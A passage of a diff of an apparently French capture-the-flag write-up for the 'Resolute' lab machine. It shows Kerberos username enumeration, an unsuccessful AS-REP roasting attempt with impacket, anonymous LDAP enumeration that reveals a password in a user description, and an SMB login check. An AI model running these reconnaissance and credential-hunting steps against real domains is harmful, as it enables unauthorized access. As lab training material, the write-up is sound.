+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:39<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>abigail@megabank.local
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:42<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Stevie@megabank.local
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:42<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>FRED@megabank.local
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:44<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Simon@megabank.local
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:53<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Annette@megabank.local
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:05<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>annika@megabank.local
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:06<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Claude@megabank.local
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:19<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>per@megabank.local
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:23<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Administrator@megabank.local
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:35<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Sally@megabank.local
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:36<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>MARCUS@megabank.local
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:45<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Claire@megabank.local
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:45<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>ANGELA@megabank.local
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:48<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>naoki@megabank.local
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:55<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Melanie@megabank.local
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:50:55<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Marko@megabank.local
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:51:07<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>SIMON@megabank.local
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:51:09<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>zach@megabank.local
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:51:44<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Paulo@megabank.local
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:51:45<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>CLAUDE@megabank.local
+</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:52:11<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Felicia@megabank.local
+</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:52:15<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>ulf@megabank.local
+</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:52:44<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>RYAN@megabank.local
+</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:53:39<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>MELANIE@megabank.local
+</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:53:40<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Gustavo@megabank.local
+</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:54:01<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>resolute@megabank.local
+</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:55:08<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>ANNETTE@megabank.local
+</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:57:11<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>STEVIE@megabank.local
+</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:57:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>PAULO@megabank.local
+</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:57:15<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>MARKO@megabank.local
+</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:57:18<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>GUSTAVO@megabank.local
+</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:57:21<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>CLAIRE@megabank.local
+</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:57:23<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Annika@megabank.local
+</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a><span class="m">2024</span>/03/19<span class="w"> </span><span class="m">00</span>:03:22<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Ulf@megabank.local
+</span></code></pre></div>
 <p>J'ai ensuite tenté de voir si certains des utilisateurs n'étaient pas asreproastables :</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -dc-ip 10.129.167.19 -usersfile users.txt megabank.local/
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User resolute doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] invalid principal syntax
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pak@DESKTOP-AF1CU53:~/tmp$<span class="w"> </span>impacket-GetNPUsers<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>megabank.local/
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Impacket<span class="w"> </span>v0.11.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2023</span><span class="w"> </span>Fortra
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>steve<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="s1">[-] User fred doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>marcus<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="s1">[-] User simon doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>ryan<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="s1">[-] User stevie doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>angela<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="s1">[-] User claire doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>claude<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="s1">[-] User melanie doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>gustavo<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="s1">[-] User administrator doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>marko<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="s1">[-] User felicia doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>annette<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="s1">[-] User per doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>sally<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="s1">[-] User zach doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>paulo<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="s1">[-] User felicia doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>ulf<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="s1">[-] User ryan doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>abigail<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="s1">[-] User naoki doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>resolute<span class="w"> </span>doesn<span class="err">&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>invalid<span class="w"> </span>principal<span class="w"> </span>syntax
+</span></code></pre></div>
 <p>Rien :). Samba ne donne rien non plus. Je tente alors une énumération du LDAP :</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ netexec ldap 10.129.167.19 -u &quot;&quot; -p &quot;&quot; -M get-desc-users
-SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
-LDAP        10.129.167.19   389    RESOLUTE         [+] megabank.local\:
-GET-DESC... 10.129.167.19   389    RESOLUTE         [+] Found following users:
-GET-DESC... 10.129.167.19   389    RESOLUTE         User: Administrator description: Built-in account for administering the computer/domain
-GET-DESC... 10.129.167.19   389    RESOLUTE         User: Guest description: Built-in account for guest access to the computer/domain
-GET-DESC... 10.129.167.19   389    RESOLUTE         User: DefaultAccount description: A user account managed by the system.
-GET-DESC... 10.129.167.19   389    RESOLUTE         User: krbtgt description: Key Distribution Center Service Account
-GET-DESC... 10.129.167.19   389    RESOLUTE         User: marko description: Account created. Password set to Welcome123!
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>pak@DESKTOP-AF1CU53:~/tmp$<span class="w"> </span>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>get-desc-users
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:RESOLUTE<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:megabank.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\:</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>GET-DESC...<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>following<span class="w"> </span>users:
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>GET-DESC...<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span>User:<span class="w"> </span>Administrator<span class="w"> </span>description:<span class="w"> </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>administering<span class="w"> </span>the<span class="w"> </span>computer/domain
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>GET-DESC...<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span>User:<span class="w"> </span>Guest<span class="w"> </span>description:<span class="w"> </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>computer/domain
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>GET-DESC...<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span>User:<span class="w"> </span>DefaultAccount<span class="w"> </span>description:<span class="w"> </span>A<span class="w"> </span>user<span class="w"> </span>account<span class="w"> </span>managed<span class="w"> </span>by<span class="w"> </span>the<span class="w"> </span>system.
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>GET-DESC...<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span>User:<span class="w"> </span>krbtgt<span class="w"> </span>description:<span class="w"> </span>Key<span class="w"> </span>Distribution<span class="w"> </span>Center<span class="w"> </span>Service<span class="w"> </span>Account
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>GET-DESC...<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">389</span><span class="w">    </span>RESOLUTE<span class="w">         </span>User:<span class="w"> </span>marko<span class="w"> </span>description:<span class="w"> </span>Account<span class="w"> </span>created.<span class="w"> </span>Password<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span>Welcome123!
+</span></code></pre></div>
 <p>On a un utilisateur et un pass ! On confirme la connexion :</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u marko -p 'Welcome123!'
-SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>pak@DESKTOP-AF1CU53:~/tmp$<span class="w"> </span>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-u<span class="w"> </span>marko<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome123!&#39;</span>
